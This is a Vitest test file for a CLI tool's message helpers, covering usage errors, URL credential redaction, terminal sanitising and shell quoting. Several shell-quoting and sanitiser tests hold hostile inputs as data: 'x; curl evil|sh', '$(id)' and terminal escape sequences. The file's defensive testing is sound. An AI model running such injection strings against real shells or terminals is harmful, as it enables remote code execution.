// Shared CLI wording: the per-command usage error, the `next:` line and URL redaction.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  commandUsage,
  redactUrl,
  redactUrlsIn,
  sanitizeForTerminal,
  shellQuote,
  usageError,
  withNext,
} from "../src/cli-messages.js";

let err = "";

beforeEach(() => {
  err = "";
  vi.spyOn(process.stderr, "write").mockImplementation((chunk: unknown) => {
    err += String(chunk);
    return true;
  });
});
afterEach(() => {
  vi.restoreAllMocks();
});

describe("commandUsage", () => {
  it("returns the usage lines of one command", () => {
    expect(commandUsage("burn")).toHaveLength(1);
    expect(commandUsage("burn")[0]).toMatch(/^docsxai burn <workspace-dir> /);
  });

  it("returns every line of a command that has several, by its first word", () => {
    expect(commandUsage("run")).toHaveLength(2);
    expect(commandUsage("pack --check")).toHaveLength(2);
    expect(commandUsage("export adf")).toHaveLength(2);
  });

  it("joins a wrapped usage entry into one line", () => {
    const [init] = commandUsage("init");
    expect(init).toContain("[--persist tmp] [--force]");
    expect(init).not.toContain("\n");
  });

  it("is empty for a name that is not a command", () => {
    expect(commandUsage("frobnicate")).toEqual([]);
  });
});

describe("usageError", () => {
  it("prints the message, the command's usage and a --help pointer, and returns 2", () => {
    expect(usageError("zip", "missing <workspace-dir>")).toBe(2);
    const lines = err.trimEnd().split("\n");
    expect(lines[0]).toBe("zip: missing <workspace-dir>");
    expect(lines[1]).toMatch(/^usage: docsxai zip <workspace-dir> /);
    expect(lines[2]).toBe("run `docsxai --help` for every flag and an example");
    expect(lines).toHaveLength(3);
  });

  it("indents the second usage line of a command under the first", () => {
    usageError("run", "x");
    expect(err).toMatch(
      /\nusage: docsxai run <workspace-dir> .*\n {7}docsxai run <workspace-dir> --verify-determinism /,
    );
  });
});

describe("withNext", () => {
  it("puts the next command on an indented line", () => {
    expect(withNext("it failed", "docsxai doctor ws")).toBe("it failed\n  next: docsxai doctor ws");
  });

  it("strips control characters but keeps the message's own line breaks", () => {
    expect(withNext("bad\u001b[2J\n  why: x", "docsxai doctor\u001b]0;t\u0007 ws")).toBe(
      "bad[2J\n  why: x\n  next: docsxai doctor]0;t ws",
    );
  });
});

describe("redactUrl", () => {
  it("drops user and password and a trailing slash", () => {
    const u = new URL("https://backend.example.com/");
    u.username = "someone";
    u.password = "hunter2";
    expect(redactUrl(u.toString())).toBe("https://backend.example.com");
  });

  it("keeps a plain URL and a path", () => {
    expect(redactUrl("http://127.0.0.1:4000/api")).toBe("http://127.0.0.1:4000/api");
  });

  it("drops the query string and the fragment", () => {
    expect(redactUrl("https://h/?token=abc")).toBe("https://h");
    expect(redactUrl("https://h/api?token=abc#access_token=xyz")).toBe("https://h/api");
    expect(redactUrl("https://someone" + ":hunter2@h:8443/p?k=v#f")).toBe("https://h:8443/p");
  });

  it("prints a placeholder for a string that is not a URL", () => {
    expect(redactUrl("//a:b@host")).toBe("<invalid url>");
    expect(redactUrl("not a url?token=abc")).toBe("<invalid url>");
    expect(redactUrl("")).toBe("<invalid url>");
  });

  it("does not print a password that follows a slash in the user part", () => {
    expect(redactUrl("https://us/er:hunter2@host")).toBe("<invalid url>");
    expect(redactUrl("https://us\\er" + ":hunter2@host/x")).toBe("<invalid url>");
    expect(redactUrl("https://us%2Fer" + ":hunter2@host")).toBe("https://host");
  });
});

describe("redactUrlsIn", () => {
  it("redacts every URL inside a message and leaves the rest", () => {
    const text =
      "request to " +
      "https://ops" +
      ":s3cret@backend.example.com/v1/x?token=abc failed (see http://h/p#frag)";
    expect(redactUrlsIn(text)).toBe(
      "request to https://backend.example.com/v1/x failed (see http://h/p)",
    );
  });

  it("returns text without a URL unchanged", () => {
    expect(redactUrlsIn("fetch failed: ECONNREFUSED")).toBe("fetch failed: ECONNREFUSED");
  });
});

describe("sanitizeForTerminal", () => {
  it("removes escape sequences, DEL and the C1 controls", () => {
    expect(sanitizeForTerminal("\u001b[31mred\u001b[0m")).toBe("[31mred[0m");
    expect(sanitizeForTerminal("a\u001b]0;pwned\u0007b")).toBe("a]0;pwnedb");
    expect(sanitizeForTerminal("a\u007fb\u009bc\u0080d\u009fe")).toBe("abcde");
  });

  it("turns a newline, carriage return and tab into a space by default", () => {
    expect(sanitizeForTerminal("a\r\nb\tc")).toBe("a  b c");
  });

  it("keeps newlines and tabs, and drops carriage returns, in multiline mode", () => {
    expect(sanitizeForTerminal("a\r\n\tb\u001b[2J", true)).toBe("a\n\tb[2J");
  });

  it("leaves ordinary text alone", () => {
    expect(sanitizeForTerminal("héllo — wörld 日本")).toBe("héllo — wörld 日本");
  });
});

describe("shellQuote", () => {
  it("leaves a safe word bare", () => {
    for (const v of ["ws", "/tmp/a-b_c.d", "tour/fr-FR", "a@b:c+d", "http://127.0.0.1:4000"]) {
      expect(shellQuote(v)).toBe(v);
    }
  });

  it("single-quotes anything else", () => {
    expect(shellQuote("my ws")).toBe("'my ws'");
    expect(shellQuote("x; curl evil|sh")).toBe("'x; curl evil|sh'");
    expect(shellQuote("$(id)")).toBe("'$(id)'");
    expect(shellQuote("")).toBe("''");
  });

  it("escapes an embedded single quote", () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it("drops control characters and keeps a newline out of the word", () => {
    expect(shellQuote("a\u001b[2Jb\nc")).toBe("'a[2Jb c'");
  });
});
